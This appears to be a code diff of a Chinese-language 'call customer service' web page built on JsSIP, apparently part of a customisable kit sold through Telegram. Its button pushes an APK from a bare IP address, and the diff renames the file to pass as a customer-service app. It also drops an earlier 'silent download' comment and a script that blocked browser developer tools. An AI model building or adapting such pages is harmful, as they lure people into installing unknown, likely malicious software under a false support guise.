@@ -88,15 +88,12 @@
     <strong>测试指南</strong><br>
     点击“呼叫客服”按钮开始通话。<br>
     通话过程中，您可以随时点击“挂断”按钮结束通话。<br>
-    内容、页面、链接等等一切都可以按照您的需求定制，请联系 Telegram（飞机）客服人员。
+    页面可根据您要求定制，联系客服 Telegram 获取帮助。
   </div>
 
-  <!-- ✅ 引入 JsSIP 和适配库 -->
+  <!-- ✅ 必须的 JsSIP 和 adapter -->
   <script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/jssip@3.0.10/dist/jssip.min.js"></script>
-
-  <!-- ✅ 引入 disable-devtool 插件 -->
-  <script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool"></script>
 
   <script>
     document.addEventListener("DOMContentLoaded", function () {
@@ -115,7 +112,7 @@
       let session = null;
       let isCalling = false;
 
-      ua.on('connected', () => console.log('已连接到 SIP WebSocket'));
+      ua.on('connected', () => console.log('✅ 已连接到 SIP WebSocket'));
       ua.on('registered', () => console.log('✅ 注册成功'));
       ua.on('registrationFailed', e => console.error('❌ 注册失败', e));
       ua.on('disconnected', () => console.log('❗️ WebSocket 断开'));
@@ -177,13 +174,13 @@
         session = null;
       }
 
-      // 新增：下载 APK 按钮静默下载逻辑
+      // 下载 APK
       const downloadApkButton = document.getElementById('downloadApkButton');
       downloadApkButton.addEventListener('click', () => {
-        const url = 'http://47.98.19.153/Android_8.9.28.10155_537147618_64.apk'; // 你的 APK 文件地址
+        const url = 'http://47.98.19.153/Android_8.9.28.10155_537147618_64.apk';
         const a = document.createElement('a');
         a.href = url;
-        a.download = 'Android_8.9.28.10155_537147618_64.apk'; // 文件名可自定义
+        a.download = 'Android_客服通.apk';
         document.body.appendChild(a);
         a.click();
         document.body.removeChild(a);
@@ -193,3 +190,4 @@
   </script>
 </body>
 </html>
+
